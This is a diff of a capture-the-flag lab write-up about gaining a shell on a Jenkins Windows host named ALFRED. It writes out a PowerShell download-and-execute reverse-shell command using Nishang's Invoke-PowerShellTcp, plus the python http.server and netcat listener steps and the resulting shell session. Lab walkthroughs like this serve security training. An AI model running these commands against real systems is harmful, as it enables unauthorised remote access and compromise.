@@ -119,45 +119,25 @@ http://<targetIP>:8080/j_security_check     (Status: 303) [Size: 0] [--> http://
 
 ---
 ### Q3: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: 
-
-Answer: not required
+No answer required. 
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 ```
-You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
-
-Answer: no response required.
 
 This requires the use of Nishang tool kit mentioned earlier. 
-Download, go to shells folder and start a python3 -m http.server to allow download from server end.
+Download, go to shells folder and start a simple python server to allow download from server end.
 ```
 ~# git clone https://github.com/samratashok/nishang
 Cloning into 'nishang'...
 ...
-~# cd nishang/Shells
-~/nishang/Shells# ls
-Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
-Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
-Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
-Invoke-PoshRatHttp.ps1               Invoke-PowerShellWmi.ps1
-Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
-Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
-Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
-Invoke-PowerShellTcpOneLine.ps1
-
-:~/nishang/Shells# python3 -m http.server 8000
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-<targetIP> - - [05/Apr/2026 13:03:02] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
-
-File downloaded successfully.
+:~/nishang/Shells# python3 -m http.server 80
 ```
 ```
 ~/nishang/Shells# nc -lnvp 4443
 Listening on 0.0.0.0 4443
 Connection received on <targetIP> 49370
 Windows PowerShell running as user bruce on ALFRED
-Copyright (C) 2015 Microsoft Corporation. All rights reserved.
-
+...
 PS C:\Program Files (x86)\Jenkins\workspace\project>Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue
 
     Directory: C:\Users\bruce\Desktop
